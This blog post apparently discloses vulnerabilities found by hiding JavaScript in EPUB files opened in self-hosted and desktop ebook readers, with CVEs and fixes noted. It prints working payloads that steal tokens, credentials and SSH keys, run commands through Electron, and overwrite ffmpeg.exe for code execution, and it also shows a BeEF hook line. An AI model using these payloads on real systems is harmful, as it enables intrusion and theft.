+++
title = "Every Trick in the Book"
author = ["Frederic Linn"]
date = 2024-06-26T20:26:00+02:00
draft = false
+++

<div class="verse">

"Reading brings us unknown friends."<br />
<br />
-- Honoré de Balzac<br />

</div>

I love generalizing an idea that helped me to achieve a specific goal.

The research presented in this article started with `Kavita`, a self-hosted digital library. I wasn't able to find any meaningful attack vector, so I've decided to make it an inside job:

By adding a malicious script to an ebook.

To my surprise, this worked and it led me down a rabbit hole of way too many reader applications.

This is by no means a revelation.[^fn:1] The dangers of executing scripts inside an `EPUB` are [well documented](https://www.w3.org/TR/epub-33/#sec-security-privacy).
Other, more thorough and academic research [exists](https://github.com/DistriNet/evil-epubs).

My personal spin, however, is to exclusively look at web-based readers. This includes desktop applications built on top of `Electron` and the like.

Firstly, we're going to learn about the inherit problem of script execution in ebooks.

Afterwards, we're going to look at seven different case studies, which often resulted in remote code execution (`RCE`).[^fn:2]

And lastly, we're going to discuss the feasibility of mounting attacks via ebooks with some hypothetical examples.

**TL;DR: We assume `JavaScript` (`JS`) execution inside web-based ebook readers. How much fun can we have?**

Alright, let's do this by the book!


### EPUB File Format {#epub-file-format}

We're not going to deep dive into the `EPUB 3` [specification](https://www.w3.org/TR/epub-33/) (which is the version we're exclusively talking about). It's a great read, but for our purposes we simply need to know a few things:

> An EPUB publication is, in its most basic sense, a bundle of resources with instructions on how to render those resources to present the content in a logical order.

Those resources consist of `XHTML` pages, `CSS` style sheets and [many others](https://www.w3.org/TR/epub-33/#sec-core-media-types). More interesting to us is the ability to house [scripted content](https://www.w3.org/TR/epub-33/#sec-scripted-content).

Long story short: `EPUBs` are build with web technology. Displaying them inside a web page[^fn:3] without restrictions is just asking for trouble.

But what exactly is dangerous about it?


### Don't Drop the SOP {#don-t-drop-the-sop}

The security guidelines in the specification provide the following advice:

> EPUB creators should note that reading systems are required to behave as though a unique origin [html] has been assigned to each EPUB publication. In practice, this means that it is not possible for scripts to share data between EPUB publications.

"A unique origin" refers to the `same-origin policy` (`SOP`), which is one of the fundamental security mechanisms of the `web platform`. Basically _page one can't access data of page two_.

As we're going to see, every presented attack in this article is made possible by serving an `EPUB` from the _same_ origin as the web page itself.

This means malicious scripts have access to the whole page, including session tokens which enable powerful interactions with the backend server! The perfect trojan 🐴.


### Epub.js {#epub-dot-js}

> Epub.js is a JavaScript library for rendering ePub documents in the browser, across many devices.

This project makes it very simple to incorporate `EPUB` rendering into a web app and is used by many applications (including most of the ones presented later in the article).

It uses an `iframe` with the [sandbox attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox) set. By default, this will serve the content from a special origin that always fails `SOP` checks.

However, the current implementation of `Epub.js` turns this off:

```js { linenos=true, linenostart=93 }
// https://github.com/futurepress/epub.js/blob/f09089cf77c55427bfdac7e0a4fa130e373a19c8/src/managers/views/iframe.js#L94
this.iframe.sandbox = "allow-same-origin";
```

By itself, this is not a problem. It's only the combination with `allow-scripts` that make the sandbox attribute useless.

Daniel Dušek [wrote](https://danieldusek.com/escaping-improperly-sandboxed-iframes.html) about how to escape such `iframes`.

Of course, the authors of `Epub.js` know about this, too. A section in their `README.md` talks about the danger of allowing scripts, which is the reason why the setting `allowScriptedContent` is set to `false` by default.

Naturally, we [search](https://github.com/search?q=allowScriptedContent+%3A+true&type=code) for every occurence where that setting is `true`, which results in an iframe with `allow-scripts` set. By doing so, we can compile a list of potential targets.

But let's take a step back first. Why would one allow scripts in the first place? Is it the fear of breaking certain _dynamic_ books?

The authors[^fn:4] of the previously mentioned "Reading Between the Lines" paper state:

> Based on our real-world analysis of 9,000 EPUBs, we argue that the discussed restrictions for the EPUB specification would have a minimal impact; none of the analyzed EPUBs required local or remote resources to render correctly, and even the few that embedded JavaScript remained functional when execution was prevented.

It seems the concern about incompatibility is unwarranted. But there's another reason:

`Safari` users.

`WebKit` has a long-standing [bug](https://bugs.webkit.org/show_bug.cgi?id=218086) that swallows events originating inside an `iframe` if `allow-scripts` is not set. This means the parent page can't handle events (click, touch etc.) that might be important for providing a good reading experience.


### Case Studies {#case-studies}

And now for the juicy part.

As always, every exploit uses this beautiful 😘 prelude:

```js { linenos=true, linenostart=1 }
const gradient = "background: linear-gradient(180deg, rgba(255, 0, 0, 1) 0%, rgba(255, 255, 0, 1) 33%, rgba(0, 192, 255, 1) 66%, rgba(192, 0, 255, 1) 100%";

console.warn("%c                                             ", gradient);
console.warn(
`%c
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|  |  |  _  |     |   __|  |  |  _  |     |   __|  |  |  _  |
|    -|     | | | |   __|     |     | | | |   __|     |     |
|__|__|__|__|_|_|_|_____|__|__|__|__|_|_|_|_____|__|__|__|__| -- GEBIRGE (2024)
`, "color: #d33682");
console.warn("%c                                             ", gradient);

const wilhelm = new Audio("https://upload.wikimedia.org/wikipedia/commons/d/d9/Wilhelm_Scream.ogg");
wilhelm.volume = 0.2;
wilhelm.play();
```

Just so it's clear where all the screaming in the demos is coming from.


#### Kavita {#kavita}

> Lightning fast with a slick design, Kavita is a rocket fueled self-hosted digital library which supports a vast array of file formats. Install to start reading and share your server with your friends.

As previously noted, it all started with `Kavita`. I did find a couple of little things, but nothing that led to a meaningful compromise of either the server or the user's data.
After a while, I thought to myself:

Why not attack from the inside‽

What does _actually_ happen if an ebook gets appended to the `DOM`?

Well, it gets... appended. Everything.

`Kavita` makes great use of `Angular's` [DomSanitizer](https://angular.dev/api/platform-browser/DomSanitizer?tab=description) in general, but the following line allows us to inject whatever we want:

```js { linenos=true, linenostart=931 }
// https://github.com/Kareadita/Kavita/blob/2fb72ab0d44d657104421ddc6250e12b6333173b/UI/Web/src/app/book-reader/_components/book-reader/book-reader.component.ts#L932
this.page = this.domSanitizer.bypassSecurityTrustHtml(content);
```

There's also no server-side sanitization, which means we're free to include whatever scripts we want.

More often than not, `JS` execution in the right user context leads to `RCE`.[^fn:5]

However, `Kavita` is quite robust in that regard. The `REST API` doesn't surface overly powerful functionality like unrestricted file uploads or plugins.

In the end, I've settled for getting the user's mail address and password. Setting them is not mandatory, so the impact is not as severe as I would hope.

Here's the "exploit":

```js { linenos=true, linenostart=1 }
(async function() {
const token = JSON.parse(localStorage.getItem("kavita-user")).token;
const headers = { Authorization: `Bearer ${token}` };
const rawResponse = await fetch("/api/settings", { headers });
const response = await rawResponse.json();
const { userName, password } = response.smtpConfig;
alert(`Username: ${userName}, Password: ${password}`);
})()
```

I've [transformed](https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Charcode('Comma',10)&input=KGFzeW5jIGZ1bmN0aW9uKCkgewpjb25zdCBncmFkaWVudCA9ICJiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTgwZGVnLCByZ2JhKDI1NSwgMCwgMCwgMSkgMCUsIHJnYmEoMjU1LCAyNTUsIDAsIDEpIDMzJSwgcmdiYSgwLCAxOTIsIDI1NSwgMSkgNjYlLCByZ2JhKDE5MiwgMCwgMjU1LCAxKSAxMDAlIjsKCmNvbnNvbGUud2FybigiJWMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBncmFkaWVudCk7CmNvbnNvbGUud2FybigKYCVjCiBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXyBfX19fXwp8ICB8ICB8ICBfICB8ICAgICB8ICAgX198ICB8ICB8ICBfICB8ICAgICB8ICAgX198ICB8ICB8ICBfICB8CnwgICAgLXwgICAgIHwgfCB8IHwgICBfX3wgICAgIHwgICAgIHwgfCB8IHwgICBfX3wgICAgIHwgICAgIHwKfF9ffF9ffF9ffF9ffF98X3xffF9fX19ffF9ffF9ffF9ffF9ffF98X3xffF9fX19ffF9ffF9ffF9ffF9ffCAtLSBHRUJJUkdFICgyMDI0KQpgLCAiY29sb3I6ICNkMzM2ODIiKTsKY29uc29sZS53YXJuKCIlYyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICIsIGdyYWRpZW50KTsKCmNvbnN0IHdpbGhlbG0gPSBuZXcgQXVkaW8oImh0dHBzOi8vdXBsb2FkLndpa2ltZWRpYS5vcmcvd2lraXBlZGlhL2NvbW1vbnMvZC9kOS9XaWxoZWxtX1NjcmVhbS5vZ2ciKTsKd2lsaGVsbS52b2x1bWUgPSAwLjI7CndpbGhlbG0ucGxheSgpOwpjb25zdCB0b2tlbiA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oImthdml0YS11c2VyIikpLnRva2VuOwpjb25zdCBoZWFkZXJzID0geyBBdXRob3JpemF0aW9uOiBgQmVhcmVyICR7dG9rZW59YCB9Owpjb25zdCByYXdSZXNwb25zZSA9IGF3YWl0IGZldGNoKCIvYXBpL3NldHRpbmdzIiwgeyBoZWFkZXJzIH0pOwpjb25zdCByZXNwb25zZSA9IGF3YWl0IHJhd1Jlc3BvbnNlLmpzb24oKTsKY29uc3QgeyB1c2VyTmFtZSwgcGFzc3dvcmQgfSA9IHJlc3BvbnNlLnNtdHBDb25maWc7CmFsZXJ0KGBVc2VybmFtZTogJHt1c2VyTmFtZX0sIFBhc3N3b3JkOiAke3Bhc3N3b3JkfWApOwp9KSgpCgo) the script and used an `onerror` handler like this:

```html
 <audio src="/this-does-not-exist.mp3" onerror="eval(String.fromCharCode(<.......>))"></audio>
```

I _think_ this slightly convoluted way of doing it was necessary because a bog standard `<script>` didn't get executed (probably because of how the ebook content gets appended to the `DOM` - a timing thing).

Anyway, here's the demo:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_kavita.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

The maintainer was very responsive, but doesn't want to remove the ability to display dynamic `EPUB` content. While I personally disagree, it's a perfectly valid stance!

Overall not a bad start, but we can _definitely_ do better!

**Update June 29, 2024: `CVE-2024-39307` was issued for this vulnerability and it is tracked [here](https://github.com/Kareadita/Kavita/security/advisories/GHSA-r4qc-3w52-2v84).**


#### Flow {#flow}

[Flow](https://www.flowoss.com/) is a browser-based open source `EPUB` reader and the first of many projects that use `Epub.js` for rendering. It's meant to be installed as a [progressive web app](https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps) (`PWA`).

Because there's no server component, the impact we can have is minimal.

I quickly looked into file handling of `PWAs` after seeing this:

```js { linenos=true, linenostart=34 }
// https://github.com/pacexy/flow/blob/08b7bb1fe3a5c084b2ff1a14e7f42865770ef660/apps/reader/public/manifest.json#L35
"file_handlers": [
    {
      "action": "/",
      "accept": {
        "application/epub+zip": ".epub",
        "application/epub": ".epub"
      },
      "launch_type": "single-client"
    }
  ]
```

My hope was that `JS` executed in the context of a `PWA` gets special capabilities. However, it [looks](https://developer.mozilla.org/en-US/docs/Web/Progressive_web_apps/How_to/Associate_files_with_your_PWA) like this is simply a way to _open with_.

`Flow` also supports syncing via `Dropbox`. [Here](https://github.com/pacexy/flow/blob/1fbf271182c3beb5204bed989a0453f0c29a605f/apps/reader/src/components/pages/settings.tsx#L68) is some logic dealing with authentication. We could probably steal the refresh token, but I have no `Dropbox` account to verify.

Here's a simple proof of concept:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_flow.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

The issue is tracked [here](https://github.com/pacexy/flow/issues/110).


#### Jellyfin {#jellyfin}

Our old media server friend `Jellyfin` uses `Epub.js`, too. They introduced `allowScriptedContent = true` with [this](https://github.com/jellyfin/jellyfin-web/pull/3547/commits/5820416edeb42402a7f9bfbde01b20a103d4a07b) commit and are well-aware of the `WebKit` bug.

Exploitation can range from stealing session tokens to remote code execution on the server.

The ability to specify the `FFmpeg` path was [removed](https://jellyfin.org/posts/jellyfin-security-and-you/), which means we can't simply use our [old](/blog/peanut-butter-jellyfin-time/#full-chain) approach.

Assuming our exploit runs in the context of an administrator account[^fn:6], we can use the [PackageController](https://github.com/jellyfin/jellyfin/blob/31aa44d23d12b5dbb5f9a131242cc82c9ef98f24/Jellyfin.Api/Controllers/PackageController.cs#L22) to add a new plugin repository and install a malicious one from there.
Plugins allow for arbitrary code execution on the server under the user account that runs `Jellyfin` itself.

I didn't write _that_ exploit, though, so here's a simple proof of concept:

```js { linenos=true, linenostart=1 }
(async function() {
const token = JSON.parse(localStorage.jellyfin_credentials).Servers[0].AccessToken;
console.log(`Session token: ${token}`);
})()
```

And here you can see it in action:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_jellyfin.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

I've notified the team on May 7, 2024 as per their security policy, but received no answer. They recently [fixed](https://github.com/jellyfin/jellyfin-web/pull/5694/commits/4ec0e2f08651787704abc82690ede40a713c0203) a similar `XSS` vulnerability for `PDFs`, so it seems they would care.

Given that many other projects already have public information about this issue and they specifically opted into the scripted content, I feel okay about sharing the information.


#### Alexandria {#alexandria}

> A minimalistic cross platform eBook reader, built with Tauri ❤️ Epub.js

`Tauri` is an `Electron` alternative, which means it's used to build desktop applications with web technology.

Naturally, there's also an [inter-process communication](https://tauri.app/v1/references/architecture/inter-process-communication/) (`IPC`) mechanism to bridge the gap between web app and host. `IPC` is _always_ worth a look, as it can expand the impact of an `XSS` vulnerability quite dramatically.

We could audit [every](https://github.com/search?q=repo%3Abtpf%2FAlexandria%20%23%5Btauri%3A%3Acommand%5D&type=code) `JS` callable function, which are annotated with `#[tauri::command]`. An attacker might get creative with those, especially if more get added over time.

I've chosen a different route: `Tauri` is configured to enable the custom `asset` protocol:

```js { linenos=true, linenostart=20, hl_lines=["5"] }
// https://github.com/btpf/Alexandria/blob/8221c77d793cab5c694707ea09f96ba41aaa3ba3/src-tauri/tauri.conf.json
"allowlist": {
      "protocol":{
        "asset": true,
        "assetScope": ["**"]
      },
```

Because a wildcard is used in line 24, every file accessible to the user can be served that way.

The following exploit fetches a private `SSH` key with a default filename:

```js { linenos=true, linenostart=1 }
(async function() {
const response = await fetch("https://asset.localhost/C:/Users/Public/.ssh/id_ed25519");
const file = await response.blob();
const privateKey = await file.text();
fetch(`http://localhost:8000?key=%${privateKey}`, { mode: "no-cors" });
})()
```

Let's see it in action:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_alexandria.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

`Alexandria's` author fixed the issue via [content security policy](https://github.com/btpf/Alexandria/commit/c71161182f9a71c8be1f5070bebc0cefc35690ba).
The issue is tracked [here](https://github.com/btpf/Alexandria/issues/46).


#### Neat-Reader {#neat-reader}

> Neat Reader is a free and easy-to-use online EPUB reader that works on all your devices and syncs your reading progress. It supports EPUB 2 and 3 standards, annotations, notes, cloud storage, and more features to enhance your reading experience.

This project uses [readium-js](https://github.com/readium/readium-js), another `EPUB` processing / rendering engine. I've found previous research by [Zeyu](https://infosec.zeyu2001.com/2023/readiumjs-cloud-reader-everybody-gets-an-xss).

Both, the web and the (`Windows`) desktop version, are vulnerable.

As one might expect, the desktop version uses `Electron`. Because they forgot some points on the [Electron security checklist](https://www.electronjs.org/docs/latest/tutorial/security#checklist-security-recommendations), we can simply get a hold of the `Node.js` integration.
In practice, this means we have complete access to the host machine from within `JS`.

Calc-popping was never easier:

```js
 window.top.require("child_process").execSync("calc");
```

As with `Flow`, the web version supports cloud syncing. Maybe we could steal some tokens relevant to those services, but I haven't tested this.

Here's a simple proof of concept for the web version:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_neat-reader-web.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

And here a calculator on `Windows`:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_neat-reader-windows.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

Testing was done on version 8.1.4 for Windows.

The issue is tracked [here](https://github.com/Gauzytech/NeatReaderBugReport/issues/20).


#### Obsidian Annotator {#obsidian-annotator}

> Obsidian is the private and flexible writing app that adapts to the way you think.

Again, this is build with `Electron`. If you want a thorough report on `Obsidian` itself, you can read `cure53's` [pentest report](https://cure53.de/pentest-report_obsidian-1.pdf).

We, however, will look at [Obsidian Annotator](https://github.com/elias-sundqvist/obsidian-annotator), a plugin that allows to open and annotate `PDFs` and `EPUBs` inside `Obsidian`.

It's rather popular:

```python { linenos=true, linenostart=1 }
# popularity.py
import requests

url = "https://raw.githubusercontent.com/obsidianmd/obsidian-releases/HEAD/community-plugin-stats.json"
data = requests.get(url).json()

target = "obsidian-annotator"
sorted_data = sorted(data.items(), key=lambda x: x[1]["downloads"], reverse=True)

for position, (key, stats) in enumerate(sorted_data):
    if key == target:
        print(f"Total number of plugins: {len(sorted_data)}")
        print(f"Total downloads of '{target}': {stats['downloads']}")
        print(f"Overall position: {position + 1}")
        break
```

```text
Total number of plugins: 1748
Total downloads of 'obsidian-annotator': 377360
Overall position: 24
```

Do note that plugins are _disabled_ by [default](https://help.obsidian.md/Extending+Obsidian/Plugin+security). For good reason, too:

> Due to technical limitations, Obsidian cannot reliably restrict plugins to specific permissions or access levels. This means that plugins will inherit Obsidian's access levels.

`Annotator` is especially interesting, because loading an `EPUB` can be done remotely via `URL`. I'm thinking of a tutorial or `stackoverflow` post that points to an inconspicuous `URL` for testing purposes:

**BOOM. RCE!**

I'm a criminal mastermind. 🧠

Exploitation is exactly the same as with `Neat-Reader`:

```js { linenos=true, linenostart=1, hl_lines=["6"] }
(async function() {
// Dirty hack because the page gets loaded two times. Can't be bothered to find out why.
if (window.pwned) return;
window.pwned = true;

window.top.require("child_process").execSync("calc");
})()
#+end_sr

window.top.require("child_process").execSync("calc");
```

We use `window.top` to make sure `require` is available, no matter how deep our code gets executed.

Here's the demo:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_obsidian-annotator.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

Tested with `Obsidian 1.5.12` and `Annotator 0.2.11` on `Windows`.

The issue is tracked [here](https://github.com/elias-sundqvist/obsidian-annotator/issues/384).


#### Audiobookshelf {#audiobookshelf}

> Audiobookshelf is an open-source self-hosted media server for your audiobooks and podcasts.

It also features basic reader support via... you guessed it: `Epub.js`.

With `JS` code execution confirmed, it's time to map out the attack surface. `Audiobookshelf` consists of a server written in `JS` and a `Vue` single page application (`SPA`).
Additional mobile apps exist in beta state, but we're focusing on the web app.

As mentioned in the `Kavita` section, getting remote code execution with an `XSS` vulnerability as the starting point is heavily dependent on the kind of functionality surfaced by the `API` that's used to communicate between client and server.

From now on, we assume a user with high privileges (upload, creation of libraries) views a malicious ebook.

Thankfully, `Audiobookshelf` offers an `OpenAPI` specification, which enables us to find interesting endpoints [here](https://api.audiobookshelf.org/#introduction). It's no replacement for actual code audit, though, as endpoints can be omitted.

In the case of `Audiobookshelf`, there's no immediate win like the ability to execute arbitrary commands on the server.

File uploads are another interesting primitive. If not handled carefully, an attacker might be able to upload into unexpected places.

`Audiobookshelf` has an `/upload` endpoint:

```js { linenos=true, linenostart=52, hl_lines=["4"] }
// https://github.com/advplyr/audiobookshelf/blob/a75ad5d6594274a6ea048e246a1cedbd2dc72cd1/server/controllers/MiscController.js
// ---snip---
// Podcasts should only be one folder deep
const outputDirectoryParts = library.isPodcast ? [title] : [author, series, title]
// `.filter(Boolean)` to strip out all the potentially missing details (eg: `author`)
// before sanitizing all the directory parts to remove illegal chars and finally prepending
// the base folder path
const cleanedOutputDirectoryParts = outputDirectoryParts.filter(Boolean).map(part => sanitizeFilename(part))
const outputDirectory = Path.join(...[folder.fullPath, ...cleanedOutputDirectoryParts])

await fs.ensureDir(outputDirectory)

Logger.info(`Uploading ${files.length} files to`, outputDirectory)

for (const file of files) {
    const path = Path.join(outputDirectory, sanitizeFilename(file.name))

    await file.mv(path)
    .then(() => {
        return true
    })
    .catch((error) => {
        Logger.error('Failed to move file', path, error)
        return false
    })
}

res.sendStatus(200)
// ---snip---
```

Nothing out of the ordinary at first glance. Line 55 highlights the special treatment for podcast libraries. More interesting than what's _here_ is what's _missing_: Checks for the existence of directories and files.

Still, we wouldn't be able to upload to an existing directory or overwrite files from within the UI. Why not?
Because an (undocumented) endpoint exists solely for guarding against this: `api/filesystem/pathexists`.

The UI code follows the expected sequence of calls, but we won't! We simply call `/upload` directly.

I don't know what caused the decision to move the functionality into a separate endpoint, but in my book it's a classic logic bug.

We have our unrestricted file upload, which is precisely what enables _the oldest trick in the book_:

{{< figure src="/every-trick-in-the-book_old-switcheroo.png" caption="<span class=\"figure-number\">Figure 1: </span>A duo plotting on how to overwrite the encoder binary." >}}

Our goal is to overwrite the `FFmpeg` binary with a malicious one and trigger its execution.

Firstly, the exploit creates a new podcast library with its root two directories above the `FFmpeg` binary. As shown above, only the title of an uploaded file inside a podcast library will be added to the path, meaning the title should be the name of the directory containing the binary.

```text
 /audiobookshelf/config/ffmpeg.exe
     ^             ^       ^
     |             |       |
  library root     |       |
                title      |
                        filename
```

We upload a file with the title 'config' and the filename 'ffmpeg.exe'. This will overwrite the legit binary. After placing the malicious binary, we create a new podcast and navigate to the library. The cover of our newly added podcasts gets loaded, which in the end triggers our malicious binary for resizing of the image.

Putting it all together, we get the following exploit:

```js { linenos=true, linenostart=1, hl_lines=["36"] }
(async function() {
const token = localStorage.token;

const baseHeaders = {
  "Authorization": `Bearer ${token}`,
};

// Because the file upload always adds the 'title' form field as a directory to a library's base directory,
// we need to specify the *parent* of the directory where the ffmpeg and ffprobe binaries reside.
// By default, the containing directory is 'config'.
// We have endpoints for retrieving directory contents, so it's straight forward to get the correct username.

const parentDirectory = "C:/Users/USERNAME/AppData/Local/Audiobookshelf";
const title = "config";
const filename = "ffmpeg.exe";

const libraryOptions = {
  name: "overlay library",
  folders: [{"fullPath": parentDirectory}],
  mediaType: "podcast", // The default is 'book', which leads to a different folder structure for uploads.
};

let response = await fetch("/api/libraries", {
  method: "POST",
  headers: {
    ...baseHeaders,
    "Content-Type": "application/json"
  },
  body: JSON.stringify(libraryOptions)
});

const libraryMetadata = await response.json();
const libraryId = libraryMetadata.id;
const folderId = libraryMetadata.folders[0].id;

const encodedDropper = "endlessly long base64 string";
const dummyUrl = `data:application/octet-stream;base64,${encodedDropper}`;
const dropper = await (await fetch(dummyUrl)).blob();

const formData = new FormData();
formData.append('title', title);
formData.append('library', libraryId);
formData.append('folder', folderId);
formData.append('0', dropper, "ffmpeg.exe");

response = await fetch("/api/upload", {
  method: "POST",
  headers: baseHeaders,
  body: formData
});

const podcastOptions = {
  path: `${parentDirectory}/dummyFolder`,
  folderId,
  libraryId,
  media: {
    metadata: {
      author: "GEBIRGE",
      feedUrl: "https://anchor.fm/s/a121a24/podcast/rss",
      imageUrl: "https://is1-ssl.mzstatic.com/image/thumb/Podcasts125/v4/a6/69/69/a6696919-3987-fbc0-8e0c-1ba0e1349a2b/mza_6631746544165345331.jpg/600x600bb.jpg",
      title: "Every Trick in the Book"
    }
  }
};

await fetch("/api/podcasts", {
  method: "POST",
  headers: {
    ...baseHeaders,
    "Content-Type": "application/json"
  },
  body: JSON.stringify(podcastOptions)
});

// Navigate to a page where our new podcast's cover will be displayed.
// This retrieves the image, which in the end triggers our malicious ffmpeg.exe binary for resizing => RCE. 🥹
setTimeout(function() {
  window.location.replace(`/library/${libraryId}`);
  }, 1000)
})()
```

As highlighted in line 36, we don't worry the _slightest_ bit about our payload size. Just inline the whole binary. We're in a fucking **book**!

Here's a video showing the exploit in action:

<video controls preload="metadata" muted><source src="/every-trick-in-the-book_audiobookshelf.mp4" type="video/mp4">
Your browser does not support the video tag.</video>

Nice.

This scenario should be exclusive to `Windows`, because dropped files on Linux lack the execution bit. I haven't tested this, though. On `Linux`, we could overwrite `~/.ssh/authorized_keys` and provide our own public key so that we can log into the machine. I also haven't tested this.

The maintainer was very responsive and provided a fix with version [2.10.0](https://github.com/advplyr/audiobookshelf/releases/tag/v2.10.0).

`CVE-2024-35236` was issued for this vulnerability and it is tracked [here](https://github.com/advplyr/audiobookshelf/security/advisories/GHSA-7j99-76cj-q9pg).


### Scheming {#scheming}

We had quite the impact in some cases, right? But how _practical_ is the idea of putting malicious code into an `EPUB`?
Every reader needs a different payload, which brings us into social-engineering territory if we hope to execute the right one in each distinct environment.

Of course, some kind of user interaction is always required. But we want to keep it to the minimum of _downloading an ebook and looking at it with reader X_.

How can we make the attack more generic?

For starters, we can use our scripts to fingerprint the environment. Not only the [browser](https://www.amiunique.org/fingerprint), but the application itself.

We'd still have to maintain a huge script with lots of conditions and branches. Most certainly we'd also get one chance only, as a second download seems highly unlikely. Goodbye, `malicious-v2.epub`.

What we really want is a stage one payload suitable for almost all environments which connects back and waits for further instructions.

🥁 🥁 🥁

Introducing [BeEF](https://beefproject.com) - the Browser Exploitation Framework.

`BeEF` works by injecting a script that handles communication between a _hooked_ browser and the `BeEF` server.

We can simply include

```html
 <script src='https://tofu.lol/hook.js'></script>
```

into our `EPUB` and wait for connections.

All kinds of useful and not so useful things are possible if we catch one:

{{< figure src="/every-trick-in-the-book_beef-commands.png" caption="<span class=\"figure-number\">Figure 2: </span>BeEF's command tab (source: <https://github.com/beefproject/beef/wiki/Interface>)" >}}

As awesome as the built-in commands are, we're mainly interested in doing some reconnaissance in order to launch the correct exploit for the environment.

Once hooked, we're free to execute whatever `JS` we want. The whole process can be [scripted](https://github.com/beefproject/beef/wiki/BeEF-RESTful-API), too!

If we don't have an exploit handy, we can at least run our cryptojacking operation on an _army_ of ebooks.

In all seriousness: Hooking can always be done where script execution is permitted.[^fn:7]
So while conceptually funny, it is _totally_ possible to create an ebook botnet!

But what makes this more interesting than a website, which can -you know- run arbitrary `JS`?

I'd argue that `EPUBs` are generally more trusted than random websites. Both, by developers of reader applications _and_ users.
As a consequence, we can get into more interesting [places](https://learn.microsoft.com/en-us/dotnet/desktop/winforms/controls/webbrowser-security?view=netframeworkdesktop-4.8) (like old `WebViews`), which can lead to serious compromise.

Another distinct advantage of `EPUBs` over normal websites is the fact that they're kept open for a lot longer.
And time is monero, as they say.

Not quite sold? How do the `EPUBs` get distributed in the first place you ask?

Well, let me ask you: Have you ever used an online converter? Or maybe that one book which is out of print since 2004 and costs $129 (used) by now fell off the back of a truck?[^fn:8]

Do you trust those online converters not to inject scripts? Do you trust the truck driver?


### Solutions {#solutions}

If we _don't_ trust them, what are our options?

As already stated, every attack was made possible because the `EPUB` was served from the same origin as the web page itself. If we can't access its resources, we can't talk to the `API` or use the `Electron` features that led to `RCE`.

Consequently, ebooks should be treated as every other user controlled resource, which means serving them from a different origin.

This can be achieved with a properly sandboxed &lt;iframe&gt; or a different (sub)domain.

While this is an effective defense against targeted exploits, we'd still be able hook the reader application with `BeEF`. All benefits discussed in the previous section apply.

Another option is to configure a `content security policy` (`CSP`). It can be used to block scripts (among other things), whether inlined or remotely fetched.

End users might be interested in the [Dangerzone](https://dangerzone.rocks/about.html) project. It works by having multiple conversion steps in different containers that result in a clean `PDF`. Because it can _only_ ouput `PDFs`, it's probably a tough sell for dedicated `EPUB` reader apps.


### Conclusion {#conclusion}

In summary, we were able to utilize the inherit scripting capabilities of `EPUBs` to exploit various reader applications - trojan horse style. Both developers and users generally put more trust into an ebook than a random website, which results in quite permissive environments. Ebooks also have other distinct advantages, like the duration they're kept open.

Furthermore, we've thought about the feasibility of this attack vector and came up with the hypothetical idea of injecting a generic payload via online converter services or pirated ebooks. Said payload hooks the reader application with the help of `BeEF`. Besides enabling reconnaissance and launching custom exploits against the various reader apps, we can do other things like mapping the local network or launching `distributed denial-of-service` attacks.

**Hopefully it goes without saying that this is purely academical! Please don't use any of the described techniques destructively. Shame on you if you do!**

While there may be use cases for script execution inside an ebook, I fail to see the benefit of enabling it _by default_.

As the authors of the "Reading Between the Lines" paper put it:

> [...] we also propose to reconsider the capability of unrestricted JavaScript execution in EPUB reading systems, perhaps requiring user consent when a script is about to be executed.

Not everything needs to be Turing-complete.

Thank you so much for reading!


### Resources and Acknowledgments {#resources-and-acknowledgments}

-   [Calibre](https://calibre-ebook.com) for editing the `EPUBs`
-   [EPUB javascript security](https://www.baldurbjarnason.com/notes/epub-javascript-security/) by Baldur Bjarnason
-   [EPUB test file](https://github.com/johnfactotum/epub-test) for testing (security) aspects of reader applications
-   [Video presentation](https://www.youtube.com/watch?v=oy6Ez68gEO8) of the `Reading Between the Lines` research
-   the developer of [Foliate](https://johnfactotum.github.io/foliate/) for their great explanations in some of the issues linked above
-   the [Dangerzone](https://dangerzone.rocks/about.html) project for safe file conversions

[^fn:1]: Well, it was for _me_.
[^fn:2]: I'm going to refer to arbitrary code execution (which is not expected `JavaScript`) as `RCE`, even if technically not _remote_. It's complicated - you'll see.
[^fn:3]: I will use the terms _website_, _web page_ and _web app_ interchangeably.
[^fn:4]: G. Franken, T. Van Goethem and W. Joosen, "Reading Between the Lines: An Extensive Evaluation of the Security and Privacy Implications of EPUB Reading Systems," 2021 IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 2021, pp. 1730-1747, doi: 10.1109/SP40001.2021.00015.
[^fn:5]: As shown [again](/blog/peanut-butter-jellyfin-time) and [again](/blog/take-your-media-anywhere-with-emby).
[^fn:6]: Which is not far-fetched. Who _does_ have two separate accounts for self-hosted apps? Apart from _you_, of course!
[^fn:7]: I've looked at a lot more readers. Even if we can't escalate from `JS` code, we still have... `JS` code.
[^fn:8]: Don't answer that! 🤫
